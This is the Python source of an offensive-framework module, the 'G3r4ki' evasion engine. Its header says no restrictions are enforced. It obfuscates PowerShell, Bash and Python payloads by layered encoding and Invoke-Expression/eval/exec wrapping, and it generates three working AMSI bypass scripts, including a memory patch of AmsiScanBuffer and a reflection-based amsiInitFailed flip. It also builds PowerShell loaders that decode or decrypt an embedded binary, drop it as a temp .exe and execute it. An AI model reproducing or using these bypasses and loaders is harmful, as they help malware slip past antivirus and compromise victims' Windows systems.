"""
G3r4ki Offensive Framework - Evasion and Obfuscation Engine

This module provides advanced evasion and obfuscation capabilities for
payloads, scripts, and binary files to avoid detection.

No capability limitations or restrictions are enforced.
"""

import os
import sys
import base64
import random
import string
import logging
import subprocess
from typing import Dict, List, Any, Optional, Union, Callable

# Configure logging
logger = logging.getLogger("g3r4ki.offensive.evasion")

class EvasionEngine:
    """Evasion and obfuscation engine for G3r4ki offensive operations."""
    
    def __init__(self, options: Optional[Dict[str, Any]] = None):
        """
        Initialize the evasion engine.
        
        Args:
            options: Module configuration options
        """
        self.options = options or {}
        self.output_dir = self.options.get("output_dir", "results/evasion")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Store available obfuscation methods
        self.powershell_obfuscation_methods = [
            self._powershell_string_format,
            self._powershell_compress_encode,
            self._powershell_char_obfuscation,
            self._powershell_variable_obfuscation,
            self._powershell_invoke_expression
        ]
        
        self.bash_obfuscation_methods = [
            self._bash_base64_encode,
            self._bash_variable_substitution,
            self._bash_string_manipulation,
            self._bash_eval_obfuscation
        ]
        
        self.python_obfuscation_methods = [
            self._python_base64_encode,
            self._python_variable_renaming,
            self._python_string_manipulation,
            self._python_exec_obfuscation
        ]
        
        # Store AMSI bypass methods
        self.amsi_bypass_methods = [
            self._amsi_memory_patching,
            self._amsi_dll_unloading,
            self._amsi_reflection_bypass
        ]
        
    def obfuscate_powershell(self, script: str, methods: Optional[List[str]] = None, 
                            level: int = 3) -> Dict[str, Any]:
        """
        Obfuscate a PowerShell script.
        
        Args:
            script: PowerShell script content
            methods: List of obfuscation method names to use
            level: Obfuscation level (1-5, where 5 is maximum obfuscation)
            
        Returns:
            Dictionary with obfuscation results
        """
        result_script = script
        applied_methods = []
        
        # Determine number of iterations based on level
        iterations = max(1, min(5, level))
        
        # Select methods to use
        available_methods = self.powershell_obfuscation_methods
        
        # Apply obfuscation in multiple passes
        for i in range(iterations):
            # Pick a random method for each iteration if not specified
            if not methods:
                method = random.choice(available_methods)
            else:
                # Use the specified methods in sequence
                method_idx = i % len(methods)
                method_name = methods[method_idx]
                method = next((m for m in available_methods if m.__name__.endswith(method_name)), 
                            random.choice(available_methods))
            
            try:
                result_script, method_info = method(result_script)
                applied_methods.append(method_info)
            except Exception as e:
                logger.error(f"Obfuscation method failed: {e}")
        
        # Output file
        output_file = os.path.join(self.output_dir, f"obfuscated_ps1_{random.randint(1000, 9999)}.ps1")
        with open(output_file, "w") as f:
            f.write(result_script)
        
        return {
            "success": True,
            "script": result_script,
            "output_file": output_file,
            "methods_applied": applied_methods,
            "obfuscation_level": level
        }
    
    def obfuscate_bash(self, script: str, methods: Optional[List[str]] = None,
                      level: int = 3) -> Dict[str, Any]:
        """
        Obfuscate a Bash script.
        
        Args:
            script: Bash script content
            methods: List of obfuscation method names to use
            level: Obfuscation level (1-5, where 5 is maximum obfuscation)
            
        Returns:
            Dictionary with obfuscation results
        """
        result_script = script
        applied_methods = []
        
        # Determine number of iterations based on level
        iterations = max(1, min(5, level))
        
        # Select methods to use
        available_methods = self.bash_obfuscation_methods
        
        # Apply obfuscation in multiple passes
        for i in range(iterations):
            # Pick a random method for each iteration if not specified
            if not methods:
                method = random.choice(available_methods)
            else:
                # Use the specified methods in sequence
                method_idx = i % len(methods)
                method_name = methods[method_idx]
                method = next((m for m in available_methods if m.__name__.endswith(method_name)), 
                            random.choice(available_methods))
            
            try:
                result_script, method_info = method(result_script)
                applied_methods.append(method_info)
            except Exception as e:
                logger.error(f"Obfuscation method failed: {e}")
        
        # Output file
        output_file = os.path.join(self.output_dir, f"obfuscated_sh_{random.randint(1000, 9999)}.sh")
        with open(output_file, "w") as f:
            f.write(result_script)
        
        return {
            "success": True,
            "script": result_script,
            "output_file": output_file,
            "methods_applied": applied_methods,
            "obfuscation_level": level
        }
    
    def obfuscate_python(self, script: str, methods: Optional[List[str]] = None,
                        level: int = 3) -> Dict[str, Any]:
        """
        Obfuscate a Python script.
        
        Args:
            script: Python script content
            methods: List of obfuscation method names to use
            level: Obfuscation level (1-5, where 5 is maximum obfuscation)
            
        Returns:
            Dictionary with obfuscation results
        """
        result_script = script
        applied_methods = []
        
        # Determine number of iterations based on level
        iterations = max(1, min(5, level))
        
        # Select methods to use
        available_methods = self.python_obfuscation_methods
        
        # Apply obfuscation in multiple passes
        for i in range(iterations):
            # Pick a random method for each iteration if not specified
            if not methods:
                method = random.choice(available_methods)
            else:
                # Use the specified methods in sequence
                method_idx = i % len(methods)
                method_name = methods[method_idx]
                method = next((m for m in available_methods if m.__name__.endswith(method_name)), 
                            random.choice(available_methods))
            
            try:
                result_script, method_info = method(result_script)
                applied_methods.append(method_info)
            except Exception as e:
                logger.error(f"Obfuscation method failed: {e}")
        
        # Output file
        output_file = os.path.join(self.output_dir, f"obfuscated_py_{random.randint(1000, 9999)}.py")
        with open(output_file, "w") as f:
            f.write(result_script)
        
        return {
            "success": True,
            "script": result_script,
            "output_file": output_file,
            "methods_applied": applied_methods,
            "obfuscation_level": level
        }
    
    def generate_amsi_bypass(self, method: Optional[str] = None) -> Dict[str, Any]:
        """
        Generate an AMSI bypass script.
        
        Args:
            method: Bypass method to use (random if not specified)
            
        Returns:
            Dictionary with bypass script
        """
        # Pick a random method if not specified
        if not method:
            bypass_method = random.choice(self.amsi_bypass_methods)
        else:
            bypass_method = next((m for m in self.amsi_bypass_methods if m.__name__.endswith(method)), 
                                random.choice(self.amsi_bypass_methods))
        
        try:
            bypass_script, method_info = bypass_method()
            
            # Output file
            output_file = os.path.join(self.output_dir, f"amsi_bypass_{random.randint(1000, 9999)}.ps1")
            with open(output_file, "w") as f:
                f.write(bypass_script)
            
            return {
                "success": True,
                "script": bypass_script,
                "output_file": output_file,
                "method": method_info
            }
        except Exception as e:
            logger.error(f"AMSI bypass method failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def encode_binary(self, binary_path: str, output_format: str = "base64", 
                     encryption_key: Optional[str] = None) -> Dict[str, Any]:
        """
        Encode a binary file to avoid detection.
        
        Args:
            binary_path: Path to the binary file
            output_format: Output format (base64, hex, etc.)
            encryption_key: Optional encryption key
            
        Returns:
            Dictionary with encoded binary
        """
        try:
            # Read the binary file
            with open(binary_path, "rb") as f:
                binary_data = f.read()
            
            if output_format == "base64":
                # Base64 encode the binary
                encoded_data = base64.b64encode(binary_data).decode()
                
                # Generate script to decode and execute
                script = self._generate_decoder_script(encoded_data, os.path.basename(binary_path), encryption_key)
                
                # Output file
                output_file = os.path.join(self.output_dir, f"encoded_{os.path.basename(binary_path)}.b64")
                with open(output_file, "w") as f:
                    f.write(encoded_data)
                
                # Output script file
                script_file = os.path.join(self.output_dir, f"decoder_{os.path.basename(binary_path)}.ps1")
                with open(script_file, "w") as f:
                    f.write(script)
                
                return {
                    "success": True,
                    "encoded_data": encoded_data,
                    "output_file": output_file,
                    "decoder_script": script,
                    "decoder_file": script_file,
                    "format": output_format
                }
            elif output_format == "hex":
                # Hex encode the binary
                encoded_data = binary_data.hex()
                
                # Generate script to decode and execute
                script = self._generate_decoder_script(encoded_data, os.path.basename(binary_path), encryption_key, "hex")
                
                # Output file
                output_file = os.path.join(self.output_dir, f"encoded_{os.path.basename(binary_path)}.hex")
                with open(output_file, "w") as f:
                    f.write(encoded_data)
                
                # Output script file
                script_file = os.path.join(self.output_dir, f"decoder_{os.path.basename(binary_path)}.ps1")
                with open(script_file, "w") as f:
                    f.write(script)
                
                return {
                    "success": True,
                    "encoded_data": encoded_data,
                    "output_file": output_file,
                    "decoder_script": script,
                    "decoder_file": script_file,
                    "format": output_format
                }
            else:
                return {
                    "success": False,
                    "error": f"Unsupported output format: {output_format}"
                }
        except Exception as e:
            logger.error(f"Binary encoding failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _generate_decoder_script(self, encoded_data: str, filename: str, 
                               encryption_key: Optional[str] = None, 
                               encoding: str = "base64") -> str:
        """
        Generate a script to decode and execute an encoded binary.
        
        Args:
            encoded_data: Encoded binary data
            filename: Original filename
            encryption_key: Optional encryption key
            encoding: Encoding format
            
        Returns:
            Decoder script
        """
        if encoding == "base64":
            if encryption_key:
                # PowerShell script to decode and decrypt
                script = f"""
# Encoded and encrypted binary loader
$encodedData = "{encoded_data}"
$encryptionKey = "{encryption_key}"

# Decode the base64 data
$decodedBytes = [System.Convert]::FromBase64String($encodedData)

# Decrypt the data
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aesManaged.KeySize = 256
$aesManaged.BlockSize = 128

$aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
$ivBytes = $decodedBytes[0..15]
$aesManaged.IV = $ivBytes

$decryptor = $aesManaged.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($decodedBytes, 16, $decodedBytes.Length - 16)

# Write to file and execute
$tempPath = [System.IO.Path]::GetTempFileName() -replace '\\.tmp$', '.exe'
[System.IO.File]::WriteAllBytes($tempPath, $decryptedBytes)
Start-Process -FilePath $tempPath -NoNewWindow
"""
            else:
                # PowerShell script to decode
                script = f"""
# Encoded binary loader
$encodedData = "{encoded_data}"

# Decode the base64 data
$decodedBytes = [System.Convert]::FromBase64String($encodedData)

# Write to file and execute
$tempPath = [System.IO.Path]::GetTempFileName() -replace '\\.tmp$', '.exe'
[System.IO.File]::WriteAllBytes($tempPath, $decodedBytes)
Start-Process -FilePath $tempPath -NoNewWindow
"""
        elif encoding == "hex":
            if encryption_key:
                # PowerShell script to decode and decrypt
                script = f"""
# Encoded and encrypted binary loader
$encodedData = "{encoded_data}"
$encryptionKey = "{encryption_key}"

# Decode the hex data
$decodedBytes = for ($i = 0; $i -lt $encodedData.Length; $i += 2) {{
    [Convert]::ToByte($encodedData.Substring($i, 2), 16)
}}

# Decrypt the data
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aesManaged.KeySize = 256
$aesManaged.BlockSize = 128

$aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
$ivBytes = $decodedBytes[0..15]
$aesManaged.IV = $ivBytes

$decryptor = $aesManaged.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($decodedBytes, 16, $decodedBytes.Length - 16)

# Write to file and execute
$tempPath = [System.IO.Path]::GetTempFileName() -replace '\\.tmp$', '.exe'
[System.IO.File]::WriteAllBytes($tempPath, $decryptedBytes)
Start-Process -FilePath $tempPath -NoNewWindow
"""
            else:
                # PowerShell script to decode
                script = f"""
# Encoded binary loader
$encodedData = "{encoded_data}"

# Decode the hex data
$decodedBytes = for ($i = 0; $i -lt $encodedData.Length; $i += 2) {{
    [Convert]::ToByte($encodedData.Substring($i, 2), 16)
}}

# Write to file and execute
$tempPath = [System.IO.Path]::GetTempFileName() -replace '\\.tmp$', '.exe'
[System.IO.File]::WriteAllBytes($tempPath, $decodedBytes)
Start-Process -FilePath $tempPath -NoNewWindow
"""
        else:
            script = f"# Unsupported encoding format: {encoding}"
        
        return script
    
    # PowerShell obfuscation methods
    def _powershell_string_format(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate PowerShell strings using format operator."""
        # Find and replace string literals
        import re
        
        def replace_string(match):
            string_content = match.group(1)
            if len(string_content) < 3:  # Skip very short strings
                return match.group(0)
            
            # Split the string into characters and create a format string
            chars = []
            format_chars = []
            for i, char in enumerate(string_content):
                # Randomly choose between character code and direct character
                if random.choice([True, False]):
                    chars.append(f"[char]0x{ord(char):X}")
                    format_chars.append("{" + str(i) + "}")
                else:
                    chars.append(f"'{char}'")
                    format_chars.append("{" + str(i) + "}")
            
            # Join the characters
            return "($(" + " + ".join(chars) + "))"
        
        # Replace string literals
        result = re.sub(r'(?<![\\\'"])"([^"]+)"', replace_string, script)
        
        return result, {
            "name": "string_format",
            "description": "String format obfuscation"
        }
    
    def _powershell_compress_encode(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate PowerShell script using compression and encoding."""
        # Compress and encode the script
        import zlib
        import base64
        
        # Add a random comment at the end to make each encoding unique
        random_comment = f"# {self._random_string(8)}"
        script_with_comment = script + "\n" + random_comment
        
        # Compress and encode
        compressed_bytes = zlib.compress(script_with_comment.encode())
        encoded_script = base64.b64encode(compressed_bytes).decode()
        
        # Create a script that decompresses and executes
        result = f"""
# Compressed and encoded script {self._random_string(4)}
$encoded = "{encoded_script}"
$decoded = [System.Convert]::FromBase64String($encoded)
$ms = New-Object System.IO.MemoryStream
$ms.Write($decoded, 0, $decoded.Length)
$ms.Seek(0,0) | Out-Null
$cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($cs)
$script = $sr.ReadToEnd()
Invoke-Expression $script
"""
        
        return result, {
            "name": "compress_encode",
            "description": "Compression and encoding obfuscation"
        }
    
    def _powershell_char_obfuscation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate PowerShell script by converting characters to character codes."""
        # Convert the script to character codes
        char_codes = []
        for char in script:
            # Randomly choose between decimal, hex, and octal representation
            code_format = random.choice(["decimal", "hex", "octal"])
            if code_format == "decimal":
                char_codes.append(f"[char]{ord(char)}")
            elif code_format == "hex":
                char_codes.append(f"[char]0x{ord(char):X}")
            elif code_format == "octal":
                char_codes.append(f"[char]0{oct(ord(char))[2:]}")
        
        # Join the character codes
        char_code_string = " + ".join(char_codes)
        
        # Create a script that reconstructs and executes
        result = f"""
# Character code obfuscated script {self._random_string(4)}
$script = {char_code_string}
Invoke-Expression $script
"""
        
        return result, {
            "name": "char_obfuscation",
            "description": "Character code obfuscation"
        }
    
    def _powershell_variable_obfuscation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate PowerShell script by using variable substitution."""
        # Identify common PowerShell command and function names
        import re
        
        # Define patterns to replace
        patterns = [
            (r"Invoke-Expression", f"${self._random_string(5)}"),
            (r"Get-Content", f"${self._random_string(5)}"),
            (r"Set-Content", f"${self._random_string(5)}"),
            (r"New-Object", f"${self._random_string(5)}"),
            (r"Write-Host", f"${self._random_string(5)}"),
            (r"Select-Object", f"${self._random_string(5)}"),
            (r"ConvertTo-SecureString", f"${self._random_string(5)}"),
            (r"Invoke-WebRequest", f"${self._random_string(5)}")
        ]
        
        # Create variable definitions
        variable_defs = []
        replacements = {}
        
        for pattern, var_name in patterns:
            var_name = var_name[1:]  # Remove $ for the definition
            replacements[pattern] = f"${var_name}"
            variable_defs.append(f"${var_name} = \"{pattern}\"")
        
        # Replace patterns
        result = script
        for pattern, replacement in replacements.items():
            result = re.sub(r"\b" + pattern + r"\b", replacement, result)
        
        # Add variable definitions at the beginning
        result = "\n".join(variable_defs) + "\n\n" + result
        
        return result, {
            "name": "variable_obfuscation",
            "description": "Variable substitution obfuscation"
        }
    
    def _powershell_invoke_expression(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate PowerShell script by wrapping it in invoke expressions."""
        # Split the script into lines
        lines = script.split("\n")
        
        # Randomly choose lines to wrap in invoke expressions
        wrapped_lines = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                wrapped_lines.append(line)
                continue
            
            # Chance to wrap line in invoke expression
            if random.random() < 0.3:
                # Encode line
                encoded_line = base64.b64encode(line.encode()).decode()
                wrapped_line = f"Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"{encoded_line}\")))"
                wrapped_lines.append(wrapped_line)
            else:
                wrapped_lines.append(line)
        
        # Join the lines
        result = "\n".join(wrapped_lines)
        
        return result, {
            "name": "invoke_expression",
            "description": "Invoke-Expression wrapping obfuscation"
        }
    
    # Bash obfuscation methods
    def _bash_base64_encode(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Bash script using base64 encoding."""
        # Encode the script
        encoded_script = base64.b64encode(script.encode()).decode()
        
        # Create a script that decodes and executes
        result = f"""
#!/bin/bash
# Base64 encoded script {self._random_string(4)}
eval $(echo "{encoded_script}" | base64 -d)
"""
        
        return result, {
            "name": "base64_encode",
            "description": "Base64 encoding obfuscation"
        }
    
    def _bash_variable_substitution(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Bash script by using variable substitution."""
        # Define command substitutions
        substitutions = {
            "echo": f"e{self._random_string(4)}",
            "cat": f"c{self._random_string(4)}",
            "grep": f"g{self._random_string(4)}",
            "find": f"f{self._random_string(4)}",
            "curl": f"u{self._random_string(4)}",
            "wget": f"w{self._random_string(4)}",
            "ls": f"l{self._random_string(4)}",
            "chmod": f"ch{self._random_string(4)}"
        }
        
        # Create variable definitions
        variable_defs = []
        for cmd, var in substitutions.items():
            variable_defs.append(f"{var}='{cmd}'")
        
        # Replace commands with variables
        result = script
        for cmd, var in substitutions.items():
            result = result.replace(f"{cmd} ", f"${var} ")
        
        # Add variable definitions at the beginning
        result = "#!/bin/bash\n# Variable substitution obfuscation\n" + "\n".join(variable_defs) + "\n\n" + result
        
        return result, {
            "name": "variable_substitution",
            "description": "Variable substitution obfuscation"
        }
    
    def _bash_string_manipulation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Bash script using string manipulation."""
        # Find and replace string literals
        import re
        
        def replace_string(match):
            string_content = match.group(1)
            if len(string_content) < 3:  # Skip very short strings
                return match.group(0)
            
            # Split the string in half and concatenate
            mid = len(string_content) // 2
            part1 = string_content[:mid]
            part2 = string_content[mid:]
            return f"\"${{{part1}\\'{part2}}}\""
        
        # Replace string literals
        result = re.sub(r"'([^']+)'", replace_string, script)
        result = re.sub(r'"([^"]+)"', replace_string, result)
        
        return result, {
            "name": "string_manipulation",
            "description": "String manipulation obfuscation"
        }
    
    def _bash_eval_obfuscation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Bash script using eval."""
        # Split the script into lines
        lines = script.split("\n")
        
        # Randomly choose lines to wrap in eval
        wrapped_lines = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#") or "#!/" in line:
                wrapped_lines.append(line)
                continue
            
            # Chance to wrap line in eval
            if random.random() < 0.3:
                # Reverse the line and wrap in eval
                reversed_line = line[::-1]
                wrapped_line = f"eval $(echo \"{reversed_line}\" | rev)"
                wrapped_lines.append(wrapped_line)
            else:
                wrapped_lines.append(line)
        
        # Join the lines
        result = "\n".join(wrapped_lines)
        
        return result, {
            "name": "eval_obfuscation",
            "description": "Eval wrapping obfuscation"
        }
    
    # Python obfuscation methods
    def _python_base64_encode(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Python script using base64 encoding."""
        # Encode the script
        encoded_script = base64.b64encode(script.encode()).decode()
        
        # Create a script that decodes and executes
        result = f"""
import base64
import sys

# Base64 encoded script {self._random_string(4)}
exec(base64.b64decode("{encoded_script}").decode())
"""
        
        return result, {
            "name": "base64_encode",
            "description": "Base64 encoding obfuscation"
        }
    
    def _python_variable_renaming(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Python script by renaming variables."""
        import re
        
        # Find variable assignments
        var_pattern = r"\b([a-zA-Z_][a-zA-Z0-9_]*)\s*="
        var_matches = re.finditer(var_pattern, script)
        
        # Map original variable names to obfuscated names
        var_mapping = {}
        for match in var_matches:
            var_name = match.group(1)
            if var_name not in var_mapping and var_name not in ["self", "cls"]:
                # Skip common built-ins
                if var_name in ["True", "False", "None", "print", "import", "from", "as", "exec", "eval"]:
                    continue
                var_mapping[var_name] = self._random_string(5)
        
        # Replace variable names
        result = script
        for original, obfuscated in var_mapping.items():
            result = re.sub(r"\b" + original + r"\b", obfuscated, result)
        
        return result, {
            "name": "variable_renaming",
            "description": "Variable renaming obfuscation"
        }
    
    def _python_string_manipulation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Python script by manipulating string literals."""
        import re
        
        def replace_string(match):
            string_content = match.group(1)
            if len(string_content) < 3:  # Skip very short strings
                return match.group(0)
            
            # Convert each character to its ordinal and create a list
            char_list = []
            for char in string_content:
                char_list.append(str(ord(char)))
            
            # Join the ordinals and create a string reconstruction
            return f"''.join([chr(int(x)) for x in [{','.join(char_list)}]])"
        
        # Replace string literals
        result = re.sub(r"'([^']+)'", replace_string, script)
        result = re.sub(r'"([^"]+)"', replace_string, result)
        
        return result, {
            "name": "string_manipulation",
            "description": "String manipulation obfuscation"
        }
    
    def _python_exec_obfuscation(self, script: str) -> Tuple[str, Dict[str, Any]]:
        """Obfuscate Python script using exec and compile functions."""
        # Add a random comment at the end to make each encoding unique
        random_comment = f"# {self._random_string(8)}"
        script_with_comment = script + "\n" + random_comment
        
        # Generate a list of different obfuscation approaches
        obfuscation_approaches = [
            f"exec(''.join(chr(ord(c)^{random.randint(1, 10)}) for c in '{self._xor_encode(script_with_comment, random.randint(1, 10))}')",
            f"exec(compile('{script_with_comment.replace('\\', '\\\\').replace(\"'\", \"\\'\").replace('{', '{{').replace('}', '}}')}'.encode('utf-8'), '<string>', 'exec'))",
            f"__import__('builtins').exec('{script_with_comment.replace('\\', '\\\\').replace(\"'\", \"\\'\").replace('{', '{{').replace('}', '}}')}')"
        ]
        
        # Select a random approach
        result = random.choice(obfuscation_approaches)
        
        return result, {
            "name": "exec_obfuscation",
            "description": "Exec/compile obfuscation"
        }
    
    # AMSI bypass methods
    def _amsi_memory_patching(self) -> Tuple[str, Dict[str, Any]]:
        """Generate an AMSI bypass script using memory patching."""
        # This method patches the AmsiScanBuffer function in amsi.dll
        script = """
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = 0
[Win32]::VirtualProtect($ptr, [UIntPtr]2, 0x40, [ref]$b)
$patch = [Byte[]] (0x48, 0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 4)

# AMSI should now be bypassed
Write-Host "AMSI bypass applied successfully"
"""
        
        return script, {
            "name": "memory_patching",
            "description": "AMSI bypass using memory patching of AmsiScanBuffer"
        }
    
    def _amsi_dll_unloading(self) -> Tuple[str, Dict[str, Any]]:
        """Generate an AMSI bypass script using DLL unloading."""
        # This method unloads the amsi.dll by setting the AmsiInitFailed field
        script = """
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

# AMSI should now be bypassed
Write-Host "AMSI bypass applied successfully"
"""
        
        return script, {
            "name": "dll_unloading",
            "description": "AMSI bypass using DLL unloading technique"
        }
    
    def _amsi_reflection_bypass(self) -> Tuple[str, Dict[str, Any]]:
        """Generate an AMSI bypass script using reflection."""
        # This method bypasses AMSI using reflection techniques
        script = """
$a = 'System.Management.Automation.A';
$b = 'ms';
$c = 'iUtils';
$ClassType = [Ref].Assembly.GetType(($a + $b + $c))
$FieldInfo = $ClassType.GetField('amsiInitFailed', 'NonPublic,Static')
$FieldInfo.SetValue($null, $true)

# Alternative technique
#[System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null), 0)

# AMSI should now be bypassed
Write-Host "AMSI bypass applied successfully"
"""
        
        return script, {
            "name": "reflection_bypass",
            "description": "AMSI bypass using reflection techniques"
        }
    
    def _random_string(self, length: int) -> str:
        """Generate a random string of given length."""
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    
    def _xor_encode(self, text: str, key: int) -> str:
        """Encode a string using XOR with a key."""
        return ''.join(chr(ord(c) ^ key) for c in text)